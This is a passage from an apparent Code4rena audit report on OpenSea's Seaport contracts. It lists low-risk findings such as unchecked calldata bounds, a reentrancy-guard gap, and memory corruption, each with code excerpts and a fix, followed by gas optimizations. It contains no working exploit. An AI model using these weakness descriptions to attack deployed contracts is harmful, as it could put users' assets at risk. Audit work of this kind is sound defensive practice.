free memory pointer in the test suite).\n\nThis would become a big issue if some functions would allocate memory. It is also very dependent on the compiler version.\n\n### Proof of Concept\n**Context:** [Consideration.sol#L76](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/Consideration.sol#L76), [BasicOrderFulfiller.sol#L70](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/BasicOrderFulfiller.sol#L70), [BasicOrderFulfiller.sol#L325](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/BasicOrderFulfiller.sol#L325)\n\n### Recommended Mitigation Steps\n\nConsider restoring the dirty memory.\n\n## [17] Parameters passed to `fulfillBasicOrder()` insufficiently checked\n\nThe parameters that are passed to function `fulfillBasicOrder()` aren't sufficiently checked. Due to some lucky circumstances this doesn't lead to issues. However it is safer to do additional checking.\n\n### Proof of Concept\n**Context:**  \n[BasicOrderFulfiller.sol#L70-L295](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/BasicOrderFulfiller.sol#L70-L295), [Consideration.sol#L76-L84](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/Consideration.sol#L76-L84)\n\nThe parameters are passed from `fulfillBasicOrder()` to `_validateAndFulfillBasicOrder()`. As these `parameters` are `calldata`, no bounds checking is done.\n\nAssume the field for `BasicOrder_basicOrderType` contains the value of 6 * 4. Then the `route` will be 6, which is an out of bounds value. However while in assembly this is not detected.\nWhen calculating `receivedItemType`, it will get a value of 4, which is a valid value (`ERC721_WITH_CRITERIA`).\nHowever if this would be used, the rest of the logic isn't prepared for this value.\n\nLuckily after the `assembly` code, `route` is evaluated in Solidity. At that moment Solidity catches the out of bound value and reverts. However if the code would be optimized with more assembly then this would not have been caught.\n\n```solidity\ncontract Consideration is ConsiderationInterface, OrderCombiner {\n    function fulfillBasicOrder(BasicOrderParameters calldata parameters) ... {\n        ...\n        fulfilled = _validateAndFulfillBasicOrder(parameters);\n    }\n}\ncontract BasicOrderFulfiller is OrderValidator {\n    function _validateAndFulfillBasicOrder(  BasicOrderParameters calldata parameters ) internal returns (bool) {\n        ...   // as the parameters are calldata, no checks on out of bound is done\n        BasicOrderRouteType route;\n        ItemType receivedItemType;\n        ...\n        assembly {\n            ...\n            route := div(calldataload(BasicOrder_basicOrderType_cdPtr), 4) // doesn't check for out of range values\n            ...\n            receivedItemType := add( // if route == 6, then receivedItemType == 4 == ERC721_WITH_CRITERIA\n                mul(sub(route, 2), gt(route, 2)), // (6-2) * 1 == 4\n                eq(route, 2)                      // + 0 == 4  // this is a valid ItemType \n        )\n        ...\n        if (additionalRecipientsItemType == ItemType.NATIVE) {   // this is luckily false\n        ...          \n        } else {\n            ...           \n            if (route == BasicOrderRouteType.ERC20_TO_ERC721) {  // this catches the out of range value\n                ...\n            }\n        }\n    }\n}\n```\n\n### Recommended Mitigation Steps\n\nIn the `assembly` code, check that `route` is within range.\n\n## [18] `startAmount` and `endAmount` being different would severely limit partial orders \n\nLet $n$ and $d$ represent `numerator` and `denominator` respectively, where $n \\le d$. Similarly, $s$ and $e$ represent `startAmount` and `endAmount`. Assume that $s \\neq e$ and for the sake of simplicity let's assume that $n$ and $d$ are in reduced form (coprime, i.e., $\\operatorname{gcd}(n, d) = 1$).\n\nThen, the following conditions have to be true for an order (here $a \\mid b$ means $a$ divides $b$):\n-  $d \\mid s$: [AmountDeriver.sol#L155](https://github.com/ProjectOpenSea/seaport/blob/6c24d09fc4be9bbecf749e6a7a592c8f7b659405/contracts/lib/AmountDeriver.sol#L155).\n-  $d \\mid e$: [AmountDeriver.sol#L156](https://github.com/ProjectOpenSea/seaport/blob/6c24d09fc4be9bbecf749e6a7a592c8f7b659405/contracts/lib/AmountDeriver.sol#L156).\n\nThis severely limits the possibilities of an order. For example, if $\\operatorname{gcd}(s, e) = 1$, then a strict partial order is impossible--only a full fill (`1 / 1`) would ever get past such checks.\n\n### Proof of Concept\n**Context:** [Seaport.sol](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/Seaport.sol)\n\nAlice places a partial order with `startAmount = 1000` and `endAmount = 2001`. Because `1000` and `2001` are coprime, such an order can only be fully filled.\n\n### Recommended Mitigation Steps\n\nPartially fillable orders with `gcd(startAmount, endAmount) == 1` should ideally be disallowed. This may be done at the frontend to simplify the code.\n\n## [19] SafeTransferFrom: `transferFrom` to precompiles may succeed, a deviation from OZ's implementation\n\n**Context**: [TokenTransferrer.sol#L72](https://github.com/ProjectOpenSea/seaport/blob/878121af65be408462f3eae04ab81018b4e199da/contracts/lib/TokenTransferrer.sol#L72)\n\n```solidity\n// If the token has no code or the transfer failed:\n// Equivalent to `or(iszero(success), iszero(extcodesize(token)))`\n// but after it's inverted for JUMPI this expression is cheaper.\nif iszero(and(iszero(iszero(extcodesize(token))), success)) {\n```\n\nThe `extcodesize` check is only done here. In contrast, the Openzeppelin implementation would do the `extcodesize` check before calling the function. Here's where this function and OZ's safetransfer would deviate: the `token` address is a precompile (so `extcodesize() == 0`), but it can still return data. For the same calldata `abi.encodeWithSelector(ERC20.transferFrom.selector, from, to, amount)`:\n1. it should return at least 32 bytes, (this is easy, for example the identity precompile at address `4`).\n2. the first 32 bytes of the `returndata` is 1. This looks a bit tricky to achieve, but perhaps with the right parameters, the `modexp` precompile should do the trick?\n\nThere were some concerns of being able to spoof this function [source](https://twitter.com/z0age/status/1528188150077542400).\n\nIt's also arguable that this is really a problem. Since `0.8.10`, the high level call `ERC20.transferFrom(...)` would skip the `extcodesize` check because it's always followed up by a `abi.decode(...)`. But `transferFrom` is a bit of a grey area because it needs compatibility with non-compliant ERC20 tokens like USDT.\n\n### Proof of Concept\n\nIt is hard to make a proof of concept for this. In the future, a new precompile may change this. \n\n### Recommended Mitigation Steps\n\nConsider adding an `extcodesize()` check before `call`. However, this adds an extra `100` gas and we can understand if the protocol decides to not implement this. :)\n\n## [20] The gas computation for memory expansion rounds down instead of rounding up \n\n**Context**: [LowLevelHelpers.sol#L54](https://github.com/ProjectOpenSea/seaport/blob/878121af65be408462f3eae04ab81018b4e199da/contracts/lib/LowLevelHelpers.sol#L54)\n\n```solidity\n            if returndatasize() {\n                // Ensure that sufficient gas is available to copy returndata\n                // while expanding memory where necessary. Start by computing\n                // the word size of returndata and allocated memory.\n                let returnDataWords := div(returndatasize(), OneWord)\n```\n\nThis rounds down the number of words (for example, if `returndatasize() = 31` the correct number of words is 1). The number of words is defined rounded up in EVM.\n\nFor a precise calculation, it should be `div(add(returndatasize(), 31), 32)`. A typical routine in internal compiler code. [Here](https://github.com/ethereum/solidity/blob/02567fd3b47cc4ca3c5d2617c4e2033a8ebe1eb8/libsolidity/codegen/YulUtilFunctions.cpp#L595) is how the Solidity compiler does it. \n\n### Proof of Concept\n\nThe above issue can affect the gas computation for `returndata`, although unlikely to the point that it is severe as the computation is still making some assumptions about `msize`.\n\n### Recommended Mitigation Steps\n\nReplace the rounding from down to up.\n\n## [21] `TokenTransferrer._performERC1155BatchTransfers` leaves corrupted memory\n\nThe function will overwrite memory starting from the `0x20` offset at least `0x104` bytes (`BatchTransfer1155Params_data_length_basePtr` * `idsLength`).\n\nIn case of successful completion, it will only \"restore\" the free memory pointer to the starting value (`mstore(FreeMemoryPointerSlot, DefaultFreeMemoryPointer)`), which is likely invalid, and will leave the zero slot and any potential user memory area dirty.\n\n### Proof of Concept\n\nThis function is only used in the `Conduit` in two places, `executeBatch1155` and `executeWithBatch1155`, e.g.:\n```solidity\n    function executeBatch1155(\n        ConduitBatch1155Transfer[] calldata batchTransfers\n    ) external override returns (bytes4 magicValue) {\n        // Ensure that the caller has an open channel.\n        if (!_channels[msg.sender]) {\n            revert ChannelClosed();\n        }\n\n        // Perform 1155 batch transfers.\n        _performERC1155BatchTransfers(batchTransfers);\n\n        // Return a magic value indicating that the transfers were performed.\n        magicValue = this.executeBatch1155.selector;\n    }\n```\n\nThe only statement after it is returning a value type, and both of these functions are marked external, so likely this is not causing any problems the way it is used currently, but the library function is unsafe in itself.\n\n### Recommended Mitigation Steps\n\nProperly restore the corrupted memory area, similar to what `_performERC1155Transfer` is doing.\n\n## [22] `_triggerIfArmed()` done outside of reentrancy guards\n\nThe function `fulfillBasicOrder()` of the reference implementation is entirely protected by the reentrancy guard.\nHowever in the production implementation, the call to `_triggerIfArmed()` isn't protected by the reentrancy guard.\nAs `_triggerIfArmed()` does external calls this doesn't seem logical, however the risk seems low.\n\nFor comparison: the comparable function`_validateAndFulfillAdvancedOrder()` is protected end to end by a reentrancy guard, which protects the call to `_applyFractionsAndTransferEach()` and thus the call to `_triggerIfArmed(accumulator);`\n\n### Proof of Concept\n**Context:** \n[ReferenceConsideration.sol#L83-L93](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/reference/ReferenceConsideration.sol#L83-L93), [Consideration.sol#L76-L84](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/Consideration.sol#L76-L84), [BasicOrderFulfiller.sol](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/BasicOrderFulfiller.sol)<br>\nReference code:\n```solidity\ncontract ReferenceConsideration is ConsiderationInterface, ReferenceOrderCombiner {\n    ...\n    function fulfillBasicOrder(BasicOrderParameters calldata parameters) ... notEntered nonReentrant ... {\n        ...\n    }\n    ...\n}\n```\nProduction code:\n```solidity\ncontract Consideration is ConsiderationInterface, OrderCombiner {\n    ...\n    function fulfillBasicOrder(BasicOrderParameters calldata parameters) ... {\n        fulfilled = _validateAndFulfillBasicOrder(parameters);\n    }\n\n   function _validateAndFulfillBasicOrder( ... ) ... {\n        ...\n        _prepareBasicFulfillmentFromCalldata( ... ); // sets reentrancy guard\n        ...    \n        _transferEthAndFinalize(... ) --or-- _transferERC20AndFinalize(...) // clears reentrancy guard\n        ... \n        _triggerIfArmed(accumulator);  // not protected by reentrancy guard\n        ...   \n    }\n\n    function _prepareBasicFulfillmentFromCalldata(...) ... {\n        // Ensure this function cannot be triggered during a reentrant call.\n        _setReentrancyGuard();\n        ...\n    }\n     function _transferEthAndFinalize(...) ... {\n        ...\n        // Clear the reentrancy guard.\n        _clearReentrancyGuard();\n    }\n  function _transferERC20AndFinalize(...) ... {\n        ...  \n        // Clear the reentrancy guard.\n        _clearReentrancyGuard();\n   }\n}\n```\n\n### Recommended Mitigation Steps\nDo the ` _clearReentrancyGuard();` after the call to ` _triggerIfArmed(accumulator);`\n\n## [23] Deviations between Solidity compiler's checks and seaport's checks in `validateOrderParameters`\n\n**Context**: [Assertions.sol#L105](https://github.com/ProjectOpenSea/seaport/blob/878121af65be408462f3eae04ab81018b4e199da/contracts/lib/Assertions.sol#L105)\n\nSome comments on comparison between code produced by solidity and this:\n\n1. If there is a parameter `BasicOrderParameters calldata`, the compiler generates the following checks:\n    1. `calldatasize() < 2**64`.\n    2. `calldataload(4) < 2**64`. (Check if the initial offset is too big)\n    3. `calldatasize() - offset >= 0x244`.\n1. The ABI encoder V2 has additional checks on whether `calldata` is properly clean. The compiler only does this checks when a value is read (a high level read; assembly doesn't count). If you want to be complaint, then the values will need to be checked for sanity. For example, an `address` type should not have dirty higher order bits. For example, for `considerationToken`.\n1. This does not check for upper bounds of length of the array `additionalRecipients`. The compiler typically checks if length is `< 2**64`. Similarly, for `bytes signature`. The length checks are surprisingly needed in general, otherwise some offset calculations can overflow and read values that it is not supposed to read. This can be used to fool some checks. Mentioned below.\n1. Both `additionalRecipents` and `signature` are responsible for at least 1 word each in `calldata` (at least length should be present). The compiler checks this. But is likely missing here. \n    1. [`calldataEncodedTailSize`](https://github.com/ethereum/solidity/blob/fdc3c8eedeae7327f772c368582e25fc6a5add5c/libsolidity/ast/Types.cpp#L1725)\n    2. [the check](https://github.com/ethereum/solidity/blob/fdc3c8eedeae7327f772c368582e25fc6a5add5c/libsolidity/codegen/YulUtilFunctions.cpp#L2356) for tail size\n1. The compiler checks that the length of the two dynamic arrays (appropriately scaled) + offsets wouldn't be past `calldatasize()`. (Note: reading past `calldatasize()` would return 0).\n\n### Recommended Mitigation Steps\n\nDocument the differences. Consider adding additional checks, if the differences need to be accounted. See a related issue regarding overflowing length, which ideally needs to be fixed.\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/203#issuecomment-1171063542):**\n > This report and its merged issues* highlight several limitations which are informative to the Opensea team. This report is of high quality and is deserving of the best score. I consider all issues raised to be valid.\n>\n> *Merged issues: #[108](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/108), [156](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/156), [176](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/176), [195](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/195), and [205](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/205).\n\n\n\n***\n\n# Gas Optimizations\n\nFor this contest, 45 reports were submitted by wardens detailing gas optimizations. The [report highlighted below](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/71) by **Dravee** received the top score from the judge.\n\n*The following wardens also submitted reports: [shung](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/60), [OriDabush](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/109), [IllIllI](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/144), [Spearbit](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/181), [cmichel](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/174), [0x1f8b](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/28), [NoamYakov](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/192), [djxploit](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/134), [0xalpharush](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/23), [Chom](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/98), [Czar102](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/191), [hickuphh3](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/42), [0x29A](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/103), [sirhashalot](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/64), [csanuragjain](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/52), [ming](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/178), [gzeon](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/162), [MaratCerby](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/4), [zkhorse](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/210), [zer0dot](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/83), [defsec](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/159), [Hawkeye](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/209), [ignacio](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/17), [joestakey](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/140), [MiloTruck](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/112), [rfa](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/193), [oyc&#95;109](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/20), [cccz](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/63), [sashik&#95;eth](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/154), [ilan](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/128), [kaden](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/70), [sach1r0](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/57), [TomJ](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/152), [twojoy](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/160), [ellahi](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/164), [TerrierLover](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/199), [asutorufos](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/137), [delfin454000](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/157), [hake](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/148), [mayo](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/86), [peritoflores](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/204), [RoiEvenHaim](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/100), [Tadashi](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/79), and [foobar](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/208).*\n\n## Table of Contents\n\n*   **[G-01]** Cheap Contract Deployment Through Clones\n*   **[G-02]** `ConduitController.sol#createConduit()`: Help the optimizer by saving a storage variable's reference instead of repeatedly fetching it\n*   **[G-03]** `ConduitController.sol#acceptOwnership()`: Help the optimizer by saving a storage variable's reference instead of repeatedly fetching it\n*   **[G-04]** `OrderValidator.sol#_validateBasicOrderAndUpdateStatus()`: Help the optimizer by saving a storage variable's reference instead of repeatedly fetching it\n*   **[G-05]** `OrderValidator.sol#_validateBasicOrderAndUpdateStatus()`: avoid an unnecessary SSTORE by not writing a default value\n*   **[G-06]** `OrderCombiner.sol`: `++totalFilteredExecutions` costs less gas compared to `totalFilteredExecutions += 1`\n*   **[G-07]** `OrderCombiner.sol`: `--maximumFulfilled` costs less gas compared to `maximumFulfilled--`\n*   **[G-08]** `FulfillmentApplier.sol#_applyFulfillment()`: Unchecking arithmetics operations that can't underflow/overflow\n*   **[G-09]** `/reference`: Unchecking arithmetics operations that can't underflow/overflow\n*   **[G-10]** `OR` conditions cost less than their equivalent `AND` conditions (\"NOT(something is false)\" costs less than \"everything is true\")\n*   **[G-11]** Bytes constants are more efficient than string constants\n*   **[G-12]** An array's length should be cached to save gas in for-loops\n*   **[G-13]** Increments can be unchecked\n*   **[G-14]** No need to explicitly initialize variables with default values\n*   **[G-15]** `abi.encode()` is less efficient than `abi.encodePacked()`\n\n## [G-01] Cheap Contract Deployment Through Clones\n\nSee `@audit` tag:\n\n```solidity\ncontracts/conduit/ConduitController.sol:\n   91:         new Conduit{ salt: conduitKey }(); //@audit gas: deployment can cost less through clones\n```\n\nThere's a way to save a significant amount of gas on deployment using Clones: <https://www.youtube.com/watch?v=3Mw-pMmJ7TA> .\n\nThis is a solution that was adopted, as an example, by Porter Finance. They realized that deploying using clones was 10x cheaper:\n\n*   <https://github.com/porter-finance/v1-core/issues/15#issuecomment-1035639516>\n*   <https://github.com/porter-finance/v1-core/pull/34>\n\nI suggest applying a similar pattern, here with a `cloneDeterministic` method to mimic the current `create2`\n\n## [G-02] `ConduitController.sol#createConduit()`: Help the optimizer by saving a storage variable's reference instead of repeatedly fetching it\n\nTo help the optimizer, declare a `storage` type variable and use it instead of repeatedly fetching the reference in a map or an array.\n\nThe effect can be quite significant.\n\nAs an example, instead of repeatedly calling `someMap[someIndex]`, save its reference like this: `SomeStruct storage someStruct = someMap[someIndex]` and use it.\n\nAffected code (check the `@audit` tags):\n\n```diff\nFile: ConduitController.sol\n- 94:         _conduits[conduit].owner = initialOwner;  //@audit gas: similar to L130, should declare \"ConduitProperties storage _conduitProperties = _conduits[conduit];\" and use it to set owner\n+ 93:         ConduitProperties storage _conduitProperties = _conduits[conduit];\n+ 94:         _conduitProperties.owner = initialOwner;\n95: \n96:         // Set conduit key used to deploy the conduit to enable reverse lookup.\n- 97:         _conduits[conduit].key = conduitKey;//@audit gas: should use suggested storage variable _conduitProperties to set key\n+ 97:        _conduitProperties.key = conduitKey;\n```\n\nNotice that this optimization already exists in the solution:\n\n```solidity\nFile: ConduitController.sol\n129:         // Retrieve storage region where channels for the conduit are tracked.\n130:         ConduitProperties storage conduitProperties = _conduits[conduit];\n```\n\n## [G-03] `ConduitController.sol#acceptOwnership()`: Help the optimizer by saving a storage variable's reference instead of repeatedly fetching it\n\nThis optimization is similar to the one explained above in G-02.\n\nInstead of repeatedly fetching the storage region, consider declaring and using a storage variable here (see `@audit` tags):\n\n```diff\nFile: ConduitController.sol\n232:     function acceptOwnership(address conduit) external override {\n...\n- 237:         if (msg.sender != _conduits[conduit].potentialOwner) { //@audit gas: similar to L130, should declare \"ConduitProperties storage _conduitProperties = _conduits[conduit];\" and use it to get potentialOwner\n+ 236:         ConduitProperties storage _conduitProperties = _conduits[conduit];\n+ 237:         if (msg.sender != _conduitProperties.potentialOwner) {\n...\n- 246:         delete _conduits[conduit].potentialOwner;//@audit gas: should use suggested storage variable _conduitProperties to delete potentialOwner\n+ 246:         delete _conduitProperties.potentialOwner;\n...\n249:         emit OwnershipTransferred(\n250:             conduit,\n- 251:             _conduits[conduit].owner, //@audit gas: should use suggested storage variable _conduitProperties to get owner\n+ 251:             _conduitProperties.owner,\n252:             msg.sender\n253:         );\n...\n- 256:         _conduits[conduit].owner = msg.sender; //@audit gas: should use suggested storage variable _conduitProperties to set owner\n+ 256:         _conduitProperties.owner = msg.sender;\n```\n\n## [G-04] `OrderValidator.sol#_validateBasicOrderAndUpdateStatus()`: Help the optimizer by saving a storage variable's reference instead of repeatedly fetching it\n\nThis optimization is similar to the one [explained here](#conduitcontrollersolcreateconduit-help-the-optimizer-by-saving-a-storage-variables-reference-instead-of-repeatedly-fetching-it).\n\nInstead of repeatedly fetching the storage region, consider declaring and using a storage variable here (see `@audit` tags):\n\n```diff\nFile: OrderValidator.sol\n48:     function _validateBasicOrderAndUpdateStatus(\n...\n- 70:         _orderStatus[orderHash].isValidated = true; //@audit gas: should declare \"OrderStatus storage _orderStatusStorage = _orderStatus[orderHash];\" and use it to set isValidated\n+ 69:         OrderStatus storage _orderStatusStorage = _orderStatus[orderHash];\n+ 70:         _orderStatusStorage.isValidated = true;\n...\n- 72:         _orderStatus[orderHash].numerator = 1;//@audit gas: should use suggested storage variable _orderStatusStorage to set numerator\n- 73:         _orderStatus[orderHash].denominator = 1;//@audit gas: should use suggested storage variable _orderStatusStorage to set denominator\n+ 72:         _orderStatusStorage.numerator = 1;\n+ 73:         _orderStatusStorage.denominator = 1;\n74:     }\n```\n\n## [G-05] `OrderValidator.sol#_validateBasicOrderAndUpdateStatus()`: avoid an unnecessary SSTORE by not writing a default value\n\nThe following line is not needed, as it's writing to storage a default value:\n\n```solidity\nFile: OrderValidator.sol\n71:         _orderStatus[orderHash].isCancelled = false;//@audit gas: SSTORE not needed, already false by default\n```\n\nConsider removing this line completely.\n\n## [G-06] `OrderCombiner.sol`: `++totalFilteredExecutions` costs less gas compared to `totalFilteredExecutions += 1`\n\nFor a `uint256 i` variable, the following is true with the Optimizer enabled at 10k:\n\n*   `i += 1` is the most expensive form\n*   `i++` costs 6 gas less than `i += 1`\n*   `++i` costs 5 gas less than `i++` (11 gas less than `i += 1`)\n\nConsider replacing `totalFilteredExecutions += 1` with `++totalFilteredExecutions` here:\n\n```solidity\nlib/OrderCombiner.sol:490:                    totalFilteredExecutions += 1;\nlib/OrderCombiner.sol:515:                    totalFilteredExecutions += 1;\nlib/OrderCombiner.sol:768:                    totalFilteredExecutions += 1;\n```\n\n## [G-07] `OrderCombiner.sol`: `--maximumFulfilled` costs less gas compared to `maximumFulfilled--`\n\nFor a `uint256 i` variable, the following is true with the Optimizer enabled at 10k:\n\n*   `i -= 1` is the most expensive form\n*   `i--` costs 11 gas less than `i -= 1`\n*   `--i` costs 5 gas less than `i--` (16 gas less than `i -= 1`)\n\nConsider replacing `maximumFulfilled--` with `--maximumFulfilled` here:\n\n```solidity\nlib/OrderCombiner.sol:229:                maximumFulfilled--;\n```\n\n## [G-08] `FulfillmentApplier.sol#_applyFulfillment()`: Unchecking arithmetics operations that can't underflow/overflow\n\nSolidity version 0.8+ comes with implicit overflow and underflow checks on unsigned integers. When an overflow or an underflow isn't possible (as an example, when a comparison is made before the arithmetic operation), some gas can be saved by using an `unchecked` block: <https://docs.soliditylang.org/en/v0.8.10/control-structures.html#checked-or-unchecked-arithmetic>\n\nI suggest wrapping with an `unchecked` block here (see `@audit` tags for more details):\n\n```solidity\nFile: FulfillmentApplier.sol\n090:         if (considerationItem.amount > execution.item.amount) {\n...\n097:             advancedOrders[targetComponent.orderIndex]\n098:                 .parameters\n099:                 .consideration[targetComponent.itemIndex]\n100:                 .startAmount = considerationItem.amount - execution.item.amount; //@audit gas: should be unchecked due to L90\n...\n104:         } else {\n...\n109:             advancedOrders[targetComponent.orderIndex]\n110:                 .parameters\n111:                 .offer[targetComponent.itemIndex]\n112:                 .startAmount = execution.item.amount - considerationItem.amount; //@audit gas: should be unchecked due to L90\n113:         }\n```\n\n## [G-09] `/reference`: Unchecking arithmetics operations that can't underflow/overflow\n\nThis is similar to the optimization above, except that here, contracts under `/reference` are just readable versions of the real contracts to be deployed.\n\nThe following lines should be `unchecked`, please check that this is the case in their corresponding assembly code:\n\n*   reference/lib/ReferenceBasicOrderFulfiller.sol:\n\n```solidity\n  842              if (additionalRecipientAmount > etherRemaining) {\n  843                  revert InsufficientEtherSupplied();\n  844              }\n  ...\n  853:             etherRemaining -= additionalRecipientAmount; //@audit gas: should be unchecked due to L842-L843\n```\n\n```solidity\n  865          if (etherRemaining > amount) {\n  866              // Transfer remaining Ether to the caller.\n  867:             _transferEth(payable(msg.sender), etherRemaining - amount); //@audit gas: should be unchecked due to L865\n  868          }\n```\n\n*   reference/lib/ReferenceFulfillmentApplier.sol:\n\n```solidity\n   99          // If total consideration amount exceeds the offer amount...\n  100          if (considerationItem.amount > execution.item.amount) {\n  ...\n  107              ordersToExecute[targetComponent.orderIndex]\n  108                  .receivedItems[targetComponent.itemIndex]\n  109:                 .amount = considerationItem.amount - execution.item.amount; //@audit gas: should be unchecked due to L100\n  ...\n  113          } else {\n  ...\n  118              ordersToExecute[targetComponent.orderIndex]\n  119                  .spentItems[targetComponent.itemIndex]\n  120:                 .amount = execution.item.amount - considerationItem.amount; //@audit gas: should be unchecked due to L100\n  121          }\n```\n\n```solidity\n  189          // If no available order was located...\n  190          if (nextComponentIndex == 0) {\n  191              // Return with an empty execution element that will be filtered.\n  192              // prettier-ignore\n  193              return Execution(\n  194                  ReceivedItem(\n  195                      ItemType.NATIVE,\n  196                      address(0),\n  197                      0,\n  198                      0,\n  199                      payable(address(0))\n  200                  ),\n  201                  address(0),\n  202                  bytes32(0)\n  203              );\n  204          }\n  205  \n  206          // If the fulfillment components are offer components...\n  207          if (side == Side.OFFER) {\n  208              // Return execution for aggregated items provided by offerer.\n  209              // prettier-ignore\n  210              return _aggregateValidFulfillmentOfferItems(\n  211                  ordersToExecute,\n  212                  fulfillmentComponents,\n  213:                 nextComponentIndex - 1 //@audit gas: should be unchecked due to L190\n  214              );\n  215          } else {\n  216              // Otherwise, fulfillment components are consideration\n  217              // components. Return execution for aggregated items provided by\n  218              // the fulfiller.\n  219              // prettier-ignore\n  220              return _aggregateConsiderationItems(\n  221                  ordersToExecute,\n  222                  fulfillmentComponents,\n  223:                 nextComponentIndex - 1, //@audit gas: should be unchecked due to L190\n  224                  fulfillerConduitKey\n  225              );\n  226          }\n```\n\n*   reference/lib/ReferenceOrderCombiner.sol:\n\n```solidity\n  629                  if (item.amount > etherRemaining) {\n  630                      revert InsufficientEtherSupplied();\n  631                  }\n  632  \n  633                  // Reduce ether remaining by amount.\n  634:                 etherRemaining -= item.amount; //@audit gas: should be unchecked due to L629\n```\n\n*   reference/lib/ReferenceOrderFulfiller.sol:\n\n```solidity\n  220                      if (amount > etherRemaining) {\n  221                          revert InsufficientEtherSupplied();\n  222                      }\n  223                      // Reduce ether remaining by amount.\n  224:                     etherRemaining -= amount; //@audit gas: should be unchecked due to L220\n```\n\n```solidity\n  273                      if (amount > etherRemaining) {\n  274                          revert InsufficientEtherSupplied();\n  275                      }\n  276                      // Reduce ether remaining by amount.\n  277:                     etherRemaining -= amount; //@audit gas: should be unchecked due to L273\n```\n\n*   reference/lib/ReferenceOrderValidator.sol:\n\n```solidity\n  220              if (filledNumerator + numerator > denominator) {\n  221                  // Reduce current numerator so it + supplied = denominator.\n  222:                 numerator = denominator - filledNumerator; //@audit gas: should be unchecked due to L220\n  223              }\n```\n\n## [G-10] `OR` conditions cost less than their equivalent `AND` conditions (\"NOT(something is false)\" costs less than \"everything is true\")\n\nRemember that the equivalent of `(a && b)` is `!(!a || !b)`\n\nEven with the 10k Optimizer enabled: `OR` conditions cost less than their equivalent `AND` conditions.\n\n### Proof of Concept\n\n*   Compare in Remix this example contract's 2 diffs (or any test-contract of your choice, as experimentation always show the same results):\n\n```diff\npragma solidity 0.8.13;\n\ncontract Test {\n    bool isOpen;\n    bool channelPreviouslyOpen;\n    \n    function boolTest() external view returns (uint) {\n-       if (isOpen && !channelPreviouslyOpen) { \n+       if (!(!isOpen || channelPreviouslyOpen)) { \n            return 1;\n-       } else if (!isOpen && channelPreviouslyOpen) {\n+       } else if (!(isOpen || !channelPreviouslyOpen)) {\n            return 2;\n        }\n    }\n\n    function setBools(bool _isOpen, bool _channelPreviouslyOpen) external {\n        isOpen = _isOpen;\n        channelPreviouslyOpen= _channelPreviouslyOpen;\n    }\n}\n```\n\n*   Notice that, even with the 10k Optimizer, the red diff version costs **8719 gas**, while the green diff version costs **8707 gas**, effectively **saving 12 gas**.\n\n### Affected Code\n\nAdded together, it's possible to save a significant amount of gas by replacing the `&&` conditions by their `||` equivalent in the solution.\n\n*   `ConduitController.sol#updateChannel()`\n\nUse `!(!isOpen || channelPreviouslyOpen)` instead of `isOpen && !channelPreviouslyOpen` and use `!(isOpen || 